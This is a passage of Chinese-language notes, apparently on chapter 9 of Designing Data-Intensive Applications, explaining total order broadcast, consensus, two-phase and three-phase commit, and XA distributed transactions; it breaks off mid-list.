<p>如果你的系统只跑在<strong>单核 CPU</strong>&nbsp; 上，那确定该系统中所有操作的全局顺序是相当简单直接的 —— 即其在 CPU 上的执行顺序。然而，在一个分布式系统中，让所有节点就所有操作的<strong>某个确定的全局序列</strong>达成一致是相当棘手的。在上一小节，我们讨论了使用时间戳或者序列号进行定序的问题，但发现相比单主模型这种方法容错能力很弱鸡（在使用时间戳定序的系统中，如果你想实现唯一性约束，就不能容忍任何故障）。</p>
<p>如前所述，单主模型通过在所有节点中选出一个主，尔后在该节点上利用某个 CPU 对所有操作进行定序，从而确定一个唯一的全局序列。但使用单主模型的系统会面临两个问题：</p>
<ol type="1">
<li>当系统负载超过单机可以处理的尺度，如何进行扩容。</li>
<li>当主节点宕机时，如何进行故障转移（failover）。</li>
</ol>
<p>在分布式系统的语境下，该问题也被称为<strong>全序广播</strong>（total order broadcast）或者<strong>原子广播</strong>（atomic broadcast）。</p>
<blockquote>
<p>顺序保证的范围。</p>
<p>多分区的数据库，对于每个分区使用单主模型，能够维持每个分区的操作全局有序，但<mark style="background: #FFF3A3A6;">并不能提供跨分区的一致性保证</mark>（比如一致性快照，外键约束）。当然，跨分区的全序保证也是可以提供的，只不过需要进行额外的协调。</p>
</blockquote>
<p>全序广播是一种多个节点间交换消息的协议。它要求系统满足两个安全性质：</p>
<ol type="1">
<li><strong>可靠交付</strong>：如果一个节点收到了消息，则系统内所有的相关节点都要收到该消息</li>
<li><strong>全序交付</strong>：每个节点接收到消息的顺序一致</li>
</ol>
<p>一个正确的全序广播算法需要保证上述两条性质在任何情况下都能够满足，包括网络故障和节点宕机。但当然，如果网络出现故障时，消息肯定不能送达所有节点；但算法可以进行重试，直到网络最终恢复（当然，恢复后也要保证所有消息送达的顺序一致）。</p>
<h4 id="使用全序广播"><strong>使用全序广播</strong></h4>
<p>像 Zookeeper 和 etcd 等共识服务都实现了全序广播算法。从这些共识服务我们能感觉到，全序广播和共识协议具有很强的关联性，我们会在本章稍后一探究竟。</p>
<p>在做数据库备份时其实我们真正需要的是全序广播：<mark style="background: #BBFABBA6;">如果每个消息都代表一次数据库的写入，且每个副本以相同的顺序处理相同的输入集，则每个副本必然会保持一致</mark>（除却暂时的临时同步延迟外）。该准则也被称为：<strong><mark style="background: #FFF3A3A6;">状态机复制</mark></strong>（state machine replication），在第 11 章的时候我们将继续该主题。</p>
<p>类似的，全序广播也可以用于实现可串行化的事务：如之前<a href="https://ddia.qtmuniao.com/#/ch07?id=%e7%89%a9%e7%90%86%e4%b8%8a%e4%b8%b2%e8%a1%8c"><strong>物理上串行</strong></a>提到的，如果每个消息都表示一个确定性事务，以存储过程的形式来执行，如果所有节点按同样的顺序处理这些消息，则数据中的所有分区和副本最终都会在数据上保持一致。</p>
<p>需要注意到，全序广播的一个重要性质是：<strong><mark style="background: #FFF3A3A6;">当收到消息时，其顺序已经确定</mark></strong>。这是因为，节点不能将后收到的消息，插入之前的已经收到的消息序列。这让全序广播要强于时间戳排序（timestamp order）。</p>
<p>还可以从另外一个角度来理解全序广播 —— 这是一种创建日志的方式（比如复制日志、事务日志或者写前日志）：<strong>传递消息就像追加写入日志</strong>。由于所有节点都会按照同样的顺序发送消息，则所有节点在读取日志的时候也会得到同样的消息序列。</p>
<p>全序广播也可以用来实现提供防护令牌功能（fencing token，参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e9%98%b2%e6%8a%a4%e4%bb%a4%e7%89%8c%ef%bc%88fencing-tokens%ef%bc%89"><strong>防护令牌</strong></a>，即关联了 id 的锁）的锁服务。每个上锁请求可以作为消息追加到日志中，依据其追加到日志中的顺序，所有请求可以被自然地编号。由于这个序列号是单调递增的，便可以充当防护令牌。在 Zookeeper 中，这个序列号便是 zxid。</p>
<h4 id="使用全序广播实现线性一致性存储"><strong>使用全序广播实现线性一致性存储</strong></h4>
<p>如图 9-4，在线性一致系统中，所有操作存在着一个全局序列。这是否意味着全序广播就是线性一致性？不尽然，但他们间有很深的联系。</p>
<blockquote>
<p>从形式上讲，线性一致读写寄存器是一个 “更容易” 的问题。 全序广播等价于共识【67】，而共识问题在异步的崩溃 - 停止模型【68】中没有确定性的解决方案，而线性一致的读写寄存器 &nbsp;<strong>可以</strong>&nbsp; 在这种模型中实现【23,24,25】。</p>
<p>然而，<mark style="background: #FFF3A3A6;">支持的原子操作的线性寄存器使它等价于共识问题</mark>【28】，诸如 &nbsp;<strong>比较并设置（CAS, compare-and-set）</strong>，或 &nbsp;<strong>自增并返回（increment-and-get）</strong>&nbsp;。 因此，共识问题与线性一致寄存器问题密切相关。</p>
</blockquote>
<p>全序广播是<strong>异步的</strong>：<mark style="background: #BBFABBA6;">系统保证以同样的<strong>顺序</strong>交付消息，但并不保证消息的交付<strong>时刻</strong></mark>（即，有的消息接收者间可能存在着滞后）。与之相对，线性一致性是一种<strong>新鲜度保证</strong>：读取一定能看到最新成功的写。</p>
<p>不过，你可以基于全序广播来构建线性一致的存储系统。如，可以用于保证用户名的唯一性约束。</p>
<p>对于该问题，可以这样实现。对每一个可能的用户名，我们使用一个支持 CAS 操作的线性寄存器，初始值为 null（表示该用户名没有被占用）。当用户想使用某个用户名创建账户时，使用 CAS 操作，在寄存器旧值为 null 时，将其值设置为该用户 account-id。由于寄存器的原子性，最后只有一个用户会成功。</p>
<p>使用全序广播系统作为<strong>日志追加服务</strong>，便可以实现这样一个支持可线性化 CAS 操作的 “寄存器”：</p>
<ol type="1">
<li>向服务中追加一个带有某用户名的消息条目，表明你想使用该用户名。</li>
<li>（由于全序广播是异步的）<mark style="background: #BBFABBA6;">不断读取日志，直到能够读到刚才你追加的消息条目</mark>。
<ol type="1">
<li>类似 Raft 的 leader 收到消息后同步给其他节点，过半成功后正式提交。</li>
</ol></li>
<li>检查所有想要使用该用户名的消息，这时你可能会得到多条消息，如果你当初写下的消息在第一条，则你是成功的。此时，你可以 “确认”（持久化，比如追加日志，比如写入数据库）占有该用户名的信息，然后给客户端返回成功。如果第一条消息不是你的，则终止请求。
<ol type="1">
<li>在正式提交之后，已有全局广播的状态，检查一致性约束是否满足。</li>
</ol></li>
</ol>
<blockquote>
<p>这里其实隐藏了一些细节，即我们会将追加消息请求发送给全序广播系统，全序广播系统会真正将消息按之前提到的两条保证的方式（可靠送达和全序送达）同步到每个节点。因此，<mark style="background: #FFF3A3A6;">对于每个节点来说，会首先发起消息追加请求，然后之后某个时刻，可以等到真正同步回来的消息</mark>。如果觉得绕，可以带入 Raft 的复制日志来类比。</p>
</blockquote>
<p>由于所有日志条目都会以同样的顺序送达每个节点，若有并发写入，则所有节点都能依靠日志顺序就谁 “先来后到” 达成一致。当有同名冲突时，可以选择第一条作为赢家，并舍弃其后的冲突请求。可以使用类似的方式，基于日志来实现涉及到多对象的事务的可串行化。</p>
<p>尽管该方式能够提供线性化的写入，却不能保证线性化的读取。如果你从一个异步同步日志的节点读取日志，就有可能读到陈旧的数据（更精确一点说，上述过程能够提供<strong>顺序一致性</strong>，s<em>equential consistency</em>，有时也被称为<strong>时间线一致性</strong>，<em>timeline consistency</em>，比线性一致性稍弱）。在此基础上，如果想让读取也变得可线性化，有几种做法：</p>
<ul>
<li><mark style="background: #BBFABBA6;">让读取也走日志</mark>，即通过追加消息的方式将读取顺序化，然后当读取请求所在节点<strong>收到</strong>这条读取日志时才去真正的去读。则消息在日志中的位置定义了整个时间序列中读取真正发生的时间点。（etcd 中的法定读取就是用的类似的做法）</li>
<li>如果日志服务允许查询最新日志的位置，则可以在请求到来时，获取当时最新位置，然后不断查询日志看是否已经跟到最新位置。如果跟到了，就进行读取。（这是 Zookeeper 中 sync () 操作的背后的原理）</li>
<li><mark style="background: #FFF3A3A6;">将读取路由到写入发生的那个节点</mark>，或者与写入严格同步的节点，以保证能够读到最新的内容。（这种技术用于<strong>链式复制</strong>，<em>chain replication</em>&nbsp; 中）</li>
</ul>
<h4 id="使用线性一致存储实现全序广播"><strong>使用线性一致存储实现全序广播</strong></h4>
<p>上节展示了如何使用全序广播来实现 CAS 操作的线性化存储。我们也可以反过来，设有一个线性一致的存储系统，看如何基于其实现全序广播。</p>
<p>最简单的方法，假设我们有一个整数寄存器，并提供 increment-and-get 原子操作，当然提供 CAS 原子操作也是可以的，只是稍微没那么直观。</p>
<p>算法相当简单：对于每一个发给全序广播系统的消息，使用整数寄存器 increment-and-get 操作关联一个序列号；然后将消息发送给所有节点（重试任何丢失的消息），<mark style="background: #BBFABBA6;">每个节点接收到消息后按照序列号顺序对外交付消息</mark>。这种机制很像 TCP，但并不是描述通信双方，而是一个分布式系统。</p>
<ul>
<li>如何判断消息是否丢失？ ACK 或者是否遇到异常。</li>
</ul>
<p>注意到，和 Lamport 时间戳不同，从线性化的寄存器中获取的数字是<strong>连续的，非跳跃的</strong>。如此一来，当某节点交付了消息 4 后，收到了消息 6，但不能立即交付，而需要等待消息 5 的到来。但在 Lamport 时间戳系统中则非如此 —— 这（是否连续）<strong>也是全序广播和时间戳顺序的核心不同</strong>。</p>
<p>实现一个支持 increment-and-get 原子操作的线性化整数寄存器有多难？如果所有组件都不会出错，则很简单：<strong>你可以直接用单台机器上的一个变量</strong>。但如果连接到该节点的网络会出问题怎么办？这台机器机器宕机后，宕机前变量的值又该怎么恢复？理论上说，只要你对线性序列生成器思考的足够完备，就会不可避免的得到一个共识算法（consensus algorithm）。</p>
<p>这并不是巧合：可以证明，<mark style="background: #FFF3A3A6;">一个线性的 CAS 寄存器和全序广播都<strong>等价于共识协议</strong></mark>（equivalent to consensus）。也即，如果你解决了其中任意一个问题，就可以通过某种手段将其转化为另一个问题的解决方案。这真是一个惊人的性质！</p>
<p>终于，说到了共识，这是本章余下将要全力探讨的问题。</p>
<h2 id="分布式事务和共识协议"><strong>分布式事务和共识协议</strong></h2>
<p>在分布式计算领域，共识问题是最重要而基础的问题。从表面上看含义很直接：可以粗略的理解为 <strong><mark style="background: #BBFABBA6;">多个节点就某件事达成共识</mark> **</strong>（get serveral nodes to agree on something）**。乍看起来，你会觉得，这有什么难的？但不幸的是，很多系统都因为低估了共识算法的实现难度而问题百出。</p>
<p>尽管共识问题非常之重要，但在本书中直到现在才才被提及，似乎有点晚了。这是因为这个主题实在是太艰深了，而欣赏其精妙需要非常多的前置知识。即使在学术界，对共识问题的研究也是历经数十年坎坷才逐渐有了一些沉淀。在本书里，我们在第五章铺垫了<strong>冗余</strong>（replication），在第七章铺陈了事务，在第八章探讨了分布式系统的<strong>系统模型</strong>，在本章又讨论了<strong>线性一致性和全序广</strong>播，到现在，我们终于做足了准备来好好谈谈共识问题了。</p>
<p>在很多场景下让多个节点达成共识是非常重要的。比如：</p>
<ul>
<li><strong>Leader 选举</strong>&nbsp;。在使用单主模型的数据库中，所有节点需要对谁是主节点达成一致。当网络问题导致有些节点不能正常通信时，领导权就会出现争议。在这种情形下，共识对于避免错误的故障转移非常重要。<mark style="background: #FF5582A6;">如果出现两个领导者可以同时接受写入（<strong>脑裂</strong>），所有副本上的数据就会产生分叉，从而变得不一致甚而数据丢失</mark>。</li>
<li><strong>原子提交</strong>。在一个横跨多节点或具有多分区的数据库中，可能会出现某个事务在一些节点执行成功，但在另外一些节点却运行失败。<mark style="background: #BBFABBA6;">如果我们想保持事务的原子性，就必须让所有节点就事务的结果达成一致：要么全部回滚（只要有故障），要么提交（没有任何故障）</mark>。这个共识的特例也被称为<strong>原子提交</strong>（atomic commit）。</li>
</ul>
<blockquote>
<p>共识的不可能性。</p>
<p>你也许听过 FLP —— 以 Fischer，Lynch 和 Paterson 三位作者姓名首字母命名的一种不可能原理 ——<mark style="background: #FF5582A6;"> 在网络可靠，但允许节点宕机（即便只有一个）的异步模型系统中，不存在总是能够达成共识的算法</mark>。在分布式系统中，我们又必须得假设节点可能会宕机，因此稳定可靠的共识算法是不存在的。但是，我们现在却在探讨可以达成共识的算法。这又是为啥？这可能吗？ 答案是，<mark style="background: #FFF3A3A6;">FLP 不可能是基于异步系统模型（参见系统模型和现实）证明的，这是一种非常苛刻的模型，不能够使用任何时钟系统和超时检测</mark>。如果允许使用超时宕机检测、或者任何可以识别节点宕机的方法，就能够实现可靠的共识算法。甚而，只让算法用随机数来进行故障检测，也能够绕过这个不可能定理。 因此，<mark style="background: #BBFABBA6;">尽管在理论上，FLP 定理非常重要，断言异步网络中共识不可能达到；但在实践中，分布式系统达成共识是可行的</mark>。</p>
</blockquote>
<p>在本小节，我们首先会详细探讨<strong>原子提交</strong>。特别的，我们将会讨论<strong>两阶段提交</strong>（2PC，two-phase commit）算法，这是一种解决原子提交的最为常见的算法，很多数据库和服务端应用都实现了该算法。可以看出，2PC 在某种程度上是一种共识协议 —— 虽然不是很完美。</p>
<p>在学习完 2PC 之后，我们将会转向更完善的共识算法，比如 Zookeeper 中用的 Zab 算法和 etcd 中用的 Raft 算法。</p>
<h3 id="原子提交与两阶段提交">原子提交与两阶段提交</h3>
<p>对于运行在<mark style="background: #BBFABBA6;">单机上的事务，原子提交通常由存储引擎层来实现</mark>。当客户端请求数据库节点提交事务时，数据库会首先将事务所涉及到的写入进行持久化（通常通过写前日志 WAL 的方式，参见<a href="https://ddia.qtmuniao.com/#/ch03?id=%e8%ae%a9-b-%e6%a0%91%e6%9b%b4%e5%8f%af%e9%9d%a0"><strong>让 B 树更可靠</strong></a>），事务结束时在硬盘上追加一个特殊的<strong>提交记录</strong>（commit record）到日志上。如果数据库在处理事务的过程中宕机了，在重启时会从日志上对事务进行恢复：</p>
<ol type="1">
<li>如果在宕机前，提交记录已经追加到磁盘上，则该事务被认为已经成功提交。</li>
<li>否则，该事务所有的写入将会被回滚。</li>
</ol>
<p>因此，在单机数据库里，事务是否提交主要取决于数据持久化到磁盘的顺序：<strong>首先是数据，接着是提交记录</strong>。提交事务还是中止事务，决定性时刻在于<strong>提交记录成功刷盘</strong>的那一瞬间：在此之前，事务可能会被中止（由于宕机）；在此之后，该事务一定会被提交（即使宕机）。也即，是唯一的硬件设备（某个特定节点上的某个具体的磁盘驱动）保证了提交的原子性。</p>
<p>然而，当事务涉及到多个节点时又当如何？例如，一个跨分区的多对象事务，或者基于关键词分区的二级索引（在该情况下，索引数据和基础数据可能不在一个分区里，参见<a href="https://ddia.qtmuniao.com/#/ch06?id=%e5%88%86%e7%89%87%e5%92%8c%e6%ac%a1%e7%ba%a7%e7%b4%a2%e5%bc%95"><strong>分片和次级索引</strong></a>）。<mark style="background: #FFF3A3A6;">大多数 “NoSQL” 分布式存储不支持这种跨节点的分布式事务，但很多分布式关系型数据库则支持。</mark></p>
<p>在上述场景中，只是简单地在提交事务时给每个节点发送提交请求让其提交事务，是不能够满足事务基本要求的。这是因为，可能有的节点成功提交了，有的节点却提交失败了，从而违反了原子性保证：</p>
<ul>
<li>有些节点在提交时检测到完整性约束被破坏了，因此中止事务；但另外一些节点却能够成功提交。</li>
<li>有些提交请求由于网络过慢而超时丢弃，另外一些提交请求却成功抵达。</li>
<li>有一些节点在写入提交记录前宕机重启，导致事务回滚；另外一些节点却成功提交。</li>
</ul>
<p>如果有些节点提交了该事务，但另外的一些节点却中止该事务了，多个节点间就会处于不一致的状态。而且，一旦事务在一个节点上提交了（即便之后发现了该事务在其他节点上失败了）就难以进行撤销。由于这个原因，我们需要<mark style="background: #BBFABBA6;">仅在确信所有相关节点都能成功提交时，本节点才能提交</mark>。</p>
<p><strong><mark style="background: #FFF3A3A6;">事务提交后是不可撤销的</mark></strong> —— 在事务提交后，你不能再改变主意说，我要重新中止这个事务。这是因为，一旦事务提交了，就会对其他事务可见，从而可能让其他事务依赖于该事务的结果做出一些新的决策；这个原则构成了<strong>读已提交</strong>（read commited）隔离级别的基础（参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e8%af%bb%e5%b7%b2%e6%8f%90%e4%ba%a4"><strong>读已提交</strong></a>）。<mark style="background: #FF5582A6;">如果事务允许在提交后中止，其他已经读取了该事务结果的事务也会失效，从而引起事务的级联中止</mark>。</p>
<p>当然，事务所造成的<strong>结果</strong>在事实上是可以被撤销的，比如，通过<strong>补偿事务</strong>（<em>compensating transaction</em>）。但，从数据库的视角来看，这就是另外一个事务了；而跨事务的正确性，需要应用层自己来保证。</p>
<h4 id="两阶段提交简介"><strong>两阶段提交简介</strong></h4>
<p><strong>两阶段提交</strong>（2PC，two-phase commit）是一种在多个节点上实现原子事务的算法 —— 即，保证所有节点要么都提交，要么都中止。这是数据库中一个经典的算法。2PC 算法会在某些数据库内部使用，有时也会以 XA 事务（支持 Java 事务 API）或者 SOAP Web 服务原子事务形式，供应用层使用。</p>
<p>2PC 基本流程如下图所示。相比单机事务的一次提交请求，<mark style="background: #FFF3A3A6;">2PC 中的提交、中止过程被拆分成了两个阶段（即名字由来）</mark>。</p>
<p><img src="ch09-fig09.png"></p>
<blockquote>
<p>不要混淆 2PC 和 2PL。</p>
<p>Two-phase commit (2PC) 和 two-phase locking (2PL，参见两阶段锁) 是两个完全不同的概念。2PC 是为了在分布式系统中进行原子提交，而 2PL 是为了进行事务并发控制的一种加锁方式。为了避免歧义，可以忽略他们在名字简写上的相似性，而把它们当成完全不同的概念。</p>
</blockquote>
<p>2PC 引入了一个单机事务中没有的角色：<strong>协调者</strong>（coordinator，有时也被称为事务管理器，transaction manager）。<mark style="background: #FFF3A3A6;">协调者通常以库的形式出现（sdk），并会嵌入到请求事务的应用进程中</mark>，但当然，它也可以以单独进程或者服务的形式出现。比如说，Narayana, JOTM, BTM, or MSDTC.</p>
<p>和单机事务一样，<mark style="background: #BBFABBA6;">2PC 事务通常也由应用层对多个节点上的数据读写开始</mark>。和协调者相对，我们将这些数据节点称为事务的<strong>参与者</strong>（participants）。当应用层准备好提交后，协调者开始<mark style="background: #FFF3A3A6;">阶段一：向每个参与者发送 &nbsp;<strong>prepare</strong>&nbsp; 请求，询问他们是否能够提交</mark>。然后，协调者会根据参与者的返回而进行下一步动作：</p>
<ol type="1">
<li>如果<strong>所有参与者</strong>都回复 “可以”（yes），表示能够提交，则协调者就会进入第二阶段发出<strong>提交</strong>（&nbsp;<strong>commit</strong>&nbsp;）请求，此时，提交才开始执行。</li>
<li>如果有任何参与者回复 “不行”（no），或者请求超时了，协调者就会进入第二阶段并发送一个 &nbsp;<strong>中止</strong>（abort）请求，中止事务。</li>
</ol>
<p>这个过程在某种程度上很像西方文化中的<strong>结婚仪式</strong>：牧师会分别问新娘、新郎是否愿意与对方结婚，通常，双方都会回答 “我愿意”（I do）。当牧师收到双方肯定的回答后，就会宣布他们结为夫妇：即事务提交，并将这个令人高兴的事实传达给所有宾客。如果新娘、新郎有任何一方回答否，则仪式中止。</p>
<h4 id="基于承诺的系统"><strong>基于承诺的系统</strong></h4>
<p>从上面的简要描述中，我们可能很难想通为什么两阶段提交能够保证原子性？而多个节点的单阶段提交就做不到这一点。毕竟，虽然是两阶段，但是两阶段中的任何一个请求都有可能在网络中丢失。让 2PC 能够保证原子性的核心原因到底是什么？</p>
<p>为了理解它的工作原理，我们把 2PC 各个阶段拆的更细一些：</p>
<ol type="1">
<li><strong><mark style="background: #BBFABBA6;">事务 ID 生成</mark></strong>。当应用想开启一个分布式事务时，它会首先向协调者要一个<strong>事务 ID</strong>，该事务 ID 是全局唯一的。</li>
<li><strong><mark style="background: #FFF3A3A6;">各节点完成单机事务</mark></strong>。应用会使用前述事务 ID 向所有的参与者发起一个单机事务，所有节点会各自完成读写请求，在此过程中，如果有任何出错（比如节点宕机或者请求超时），协调者或者任意参与者都可以中止事务。</li>
<li><strong><mark style="background: #BBFABBA6;">协调者发起 prepare，询问该事务是否可提交</mark></strong>。当应用层准备好提交事务时，协调者会向所有参与者发送<strong>准备提交</strong>（prepare）请求，并在请求中打上事务 ID 标记。如果有请求失败或者超时，则协调者会对所有参与者发送带有该事务 ID 的中止请求。</li>
<li><mark style="background: #FFF3A3A6;">参与者回复 prepare</mark>。当参与者收到<strong>准备提交</strong>请求时，它<mark style="background: #FFF3A3A6;">必须确认该事务能够在任何情况下都能被提交，才能回复 “<strong>可以</strong>”。这包括，将所有写入刷到磁盘</mark>（一旦承诺了，就不能反悔，即使之后遇到宕机、断电或者磁盘空间不足）、检查是否有冲突或者违反约束的情况。换句话说，<mark style="background: #FF5582A6;">如果回复 “可以”，意味着参与者<strong>让渡了中止事务的权利（给协调者）</strong>，但此时并没有真正地提交</mark>。</li>
<li><strong><mark style="background: #BBFABBA6;">协调者决定事务提交还是终止，将决策刷盘</mark></strong>。当协调者收到所有参与者准备提交的回复后，会决定提交还是中止该事务（只有在所有参与者都回复 “可以” 时，才会提交）。协调者需要将该决策写入事务日志，并下刷到磁盘，以保证即使宕机重启，该决策也不会丢失。这被称为<strong>提交点</strong>（commit point）。</li>
<li><mark style="background: #FFF3A3A6;">协调者将决策刷入了磁盘后，就会将决策（提交或者中止）请求发给所有参与方</mark>。如果某个请求失败或者超时，则协调者会对其进行无限重试，直到成功。不允许走回头路：如果协调者决定了提交，则不管要进行多少次的重试，也必须要保证该决策的执行。如果参与者在此时宕机了，则当重启时也必须进行提交 —— 因为它<strong>承诺过要提交</strong>，因此在重启后不能拒绝提交。</li>
</ol>
<p>因此，该协议有<mark style="background: #FF5582A6;">两个重要的 “不可回退点”</mark>：</p>
<ol type="1">
<li>当<mark style="background: #BBFABBA6;">某个参与者回复 “可以” 时</mark>，就做出了（将来无论发生什么）肯定可以提交的承诺。（当然，协调者可以中止事务）</li>
<li>当<mark style="background: #FFF3A3A6;">协调者决定提交时</mark>，该决定一旦做出（写入磁盘），就是不可撤回的。</li>
</ol>
<p>这两个承诺保证了 2PC 的原子性（其实单机事务是将上述两个事件合二为一：将提交记录写入事务日志即代表提交）。</p>
<p>说回婚礼的比喻，在说 “我愿意” 之前，双方都有说 “没门”（或者任何相当言论）来中止事务的自由。然而，一旦承诺 “我愿意”，就不能收回该承诺。即使你在说出 “我愿意” 之后昏倒过去，哪怕没有听到牧师说 “你们现在已结为夫妻”，也不影响对应事务已经提交的事实。当你之后恢复意识时，可以凭借事务 ID 向牧师询问你们的婚姻状态，或者简单的等待牧师下一次重试的提交请求（重试会在你昏迷期间一直进行）。</p>
<h4 id="协调者故障"><strong>协调者故障</strong></h4>
<p>我们已经讨论了在 2PC 中如果任何一个<strong>参与者</strong>（participant）或者网络故障时的系统行为：</p>
<ol type="1">
<li>如果任意准备提交（prepare）请求失败，则协调者中止事务。</li>
<li>如果任意提交（commit）或者中止（abort）请求失败，则协调者会进行无限重试。</li>
</ol>
<p>然而，我们还没有讨论，当<strong>协调者故障</strong>（coordinator failure）时，系统应当如何应对。</p>
<p><mark style="background: #BBFABBA6;">如果协调者在准备提交请求发送前故障，则参与者可以放心的中止事务</mark>。然而，<mark style="background: #FFF3A3A6;">一旦参与者收到准备提交请求，并且回复 “可以”</mark>，则根据 2PC 设定，它<strong>不能单方面的中止事务</strong> —— 而必须等待协调者的提交或者中止请求。如果此时协调者宕机或者网络故障，则参与者只能<strong>死等</strong>。<mark style="background: #FFF3A3A6;">参与者事务的这种状态称为<strong>存疑</strong>（in doubt）或者<strong>未定</strong>（uncertain）</mark>。</p>
<p>图 9-10 就是一个这样的例子。在该例子中，系统处于第二阶段，协调者准备提交，并且数据库实例 2 收到了提交请求。此时，协调者宕机，还没来得及给数据库实例 1 发送提交请求，因此该实例不知道是要提交还是中止事务。超时机制在这里并不能解决问题：超时后，如果数据库实例 1 单方面决定中止事务，则会和数据库实例 2 处于不一致的状态。类似的，单方面提交事务也不靠谱，毕竟另外的参与者也可能收到请求并中止了事务。</p>
<p><img src="ch09-fig10.png"></p>
<p><mark style="background: #FF5582A6;">在未收到协调者的消息前，参与者无从得知是要提交还是中止</mark>。原则上，参与者之间可以<strong>互相沟通</strong>以确定该如何进行下一步，并最终达到一致，但这已经超脱了 2PC 协议范畴。</p>
<p><mark style="background: #BBFABBA6;">在 2PC 中，唯一使算法能够完成的方法就是等待协调者恢复</mark>。这也是为什么，协调者在给参与者发送提交或者中止消息时，需要先将该决策写入事务日志中：当协调者恢复时，他就能从事务日志中读取该决策，以让所有处于未决状态的参与者状态确定下来。如果协调者恢复了，发现并没有写入任何决策到事务日志中，则中止该事务。因此，<mark style="background: #BBFABBA6;">2PC 的<strong>提交点</strong>（commit point）最终可以归结到协调者上的单机原子提交</mark>。</p>
<h4 id="三阶段提交"><strong>三阶段提交</strong></h4>
<p>由于 2PC 在等待协调者宕机恢复时系统可能会卡住，因此两阶段提交又称为<strong>阻塞式原子提交协议</strong>（blocking atomic commit protocol）。理论上，可以让使用某种办法让原子提交协议成为非阻塞的，从而在协调者宕机时，系统不会卡住。然而，在实践中该办法很不直观。</p>
<p>作为 2PC 的替代，人们又提出了三阶段提交（three-phase commit）。然而，3PC 对系统有一定假设：网络具有有界延迟，请求延迟也是有界的（bounded，参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e8%b6%85%e6%97%b6%e5%92%8c%e6%97%a0%e7%95%8c%e5%bb%b6%e8%bf%9f%ef%bc%88unbounded-delays%ef%bc%89"><strong>超时和无界延迟</strong></a>）。<mark style="background: #FFF3A3A6;">在具有无界网络延迟进程停顿的实际系统中，3PC 无法保证原子性</mark>。</p>
<p>一般来说，非阻塞的原子提交依赖于一个<strong>完美的故障检测器</strong>（perfect failure detector）—— 即，一种可以判断某个节点是否宕机的可靠机制。在具有无界延迟的网络中，超时机制就不是一个可靠的故障检测方法，即使没有任何节点故障，一个请求仍会由于网络问题而超时。出于这个原因，即使 2PC 可能会因为协调者宕机卡住，但人们仍然在使用它，而没有转向 3PC。</p>
<h3 id="实践中的分布式事务"><strong>实践中的分布式事务</strong></h3>
<p>分布式事务，尤其是使用两阶段提交实现的分布式事务，毁誉参半。一方面，他们可以提供其他方式难以实现的<strong>安全保证</strong>；另一方面，由于运维复杂、降低性能、承诺过多，他们广受诟病。<mark style="background: #BBFABBA6;">为了避免分布式事务带来的运维复杂度，很多云服务选择不支持分布式事务。</mark></p>
<p><mark style="background: #FF5582A6;">很多分布式事务的实现会带来严重的性能下降 —— 如 MySQL 中的分布式事务据说比单机事务慢 10 倍以上</mark>，也无怪乎人们建议不要用。两阶段提交的很多性能损耗是算法内生的：</p>
<ol type="1">
<li>处理协调者宕机恢复所需要的额外刷盘（fsync）</li>
<li>协调者和参与者额外的网络往返开销</li>
</ol>
<p>相较于完全弃之不用，我们应当更加细致地考量分布式事务，因为可以从其中学到相当多的经验教训。首先，我们需要精确地定义什么是 “分布式事务”。有两种完全不同的分布式事务经常被混淆：</p>
<ul>
<li><strong><mark style="background: #BBFABBA6;">数据库内部分布式事务</mark></strong>&nbsp;。在一些分布式数据中（标配支持多分区和多副本的数据库），支持跨节点的<strong>内部分布式事务</strong>。如，VoltDB 和 MySQL 集群的 NDB 存储引擎就有这样的内部事务支持。在这种情况下，<mark style="background: #BBFABBA6;">所有事务参与节点都运行着同样的二进制代码。</mark></li>
<li><strong><mark style="background: #FF5582A6;">异构的分布式事务</mark></strong>。在异构的分布式事务中，所有参与者使用了两种以上的技术栈：如，<mark style="background: #FF5582A6;">来自不同厂家的两种数据库实例，甚至可能包含非数据库系统</mark>，如消息队列。即使每个子系统内部实现完全不同，构建于其上的分布式事务也能够保证原子提交。</li>
</ul>
<p><mark style="background: #BBFABBA6;">数据库内部的事务不需要考虑和其他系统的相容性，因此在实现时可以使用任何协议、可以针对特定技术栈进行任何优化</mark>。因此，数据库内部的分布式事务通常能够很好地工作。相反，横跨多个异构系统的事务实现则充满了挑战。</p>
<h4 id="恰好一次的消息处理"><strong>恰好一次的消息处理</strong></h4>
<p>异构的分布式事务系统可以将多种异构的系统，以强大的方式进行整合。例如，<strong>当且仅当</strong>数据库中处理消息的事务成功提交时，消息队列才会将该消息标记为<strong>已处理</strong>。可以将消息确认和数据库写入打包在单个事务里进行原子提交，来实现上述行为。在分布式事务的加持下，即使消息队列和数据库是跑在不同机器上的不同技术栈的进程，上述目标也能实现。</p>
<p>如果<strong>消息投递</strong>或<strong>数据库事务</strong>任意一方出错，两者都会被中止。据此，消息队列可以在之后安全地重新投递该消息。通过将<strong>消息投递</strong>和<strong>消息处理</strong>打包进行原子地提交，不管成功之前重试多少次，我们都可以保证该消息只被<strong>有效地</strong>（effectively）处理<strong>恰好一次</strong>（exactly once）。中止事务时，会丢弃所有部分执行的结果。</p>
<p><strong><mark style="background: #FFF3A3A6;">只有参与系统都支持原子提交时，上述分布式事务才是可行的</mark></strong>。例如，假设处理消息的一个副作用是发送邮件，且邮件服务器不支持两阶段提交。则在消息处理失败进行重试的过程中，可能出现邮件被发送多次的现象。但如果，在事务中止时，消息处理的所有副作用都可以回滚，则处理步骤可以像没有任何事情发生过一样，安全地进行重试。</p>
<p>我们在第十一章的时候会重新探讨对消息进行恰好一次的处理的话题。这里，我们首先看下异构系统上的分布式事务的<strong>原子提交协议</strong>（atomic commit protocol）。</p>
<h4 id="xa-事务"><strong>XA 事务</strong></h4>
<p>X/Open XA （e<strong>X</strong>tended&nbsp;<strong>A</strong>rchitecture 的简写）<mark style="background: #BBFABBA6;">是在异构系统间实现两阶段提交的一个标准</mark>。它于 1991 年被引入，并被广泛的实现：很多传统的关系型数据库（包括 PostgreSQL，MySQL，DB2，SQL Server 和 Oracle）和消息队列（包括 ActiveMQ，HornetQ，MSMQ 和 IBM MQ）都支持 XA 协议。</p>
<p><mark style="background: #FFF3A3A6;">XA 不是一个网络协议 —— 它定义了一组和事务协调者交互的 C 语言 API 接口</mark>。当然，该 API 也有其他语言实现。比如，在 Java EE 应用，XA 事务使用 Java 事务 API（JTA）实现，进而被很多支持 JDBC 的数据库使用，也被 Java Message Service（JMS）的消息队列所支持。</p>
<blockquote>
<p>Open Group 组织针对 XA 定义了分布式事务处理模型，也被称为 DTP 模型。包括三个组件，</p>
<ul>
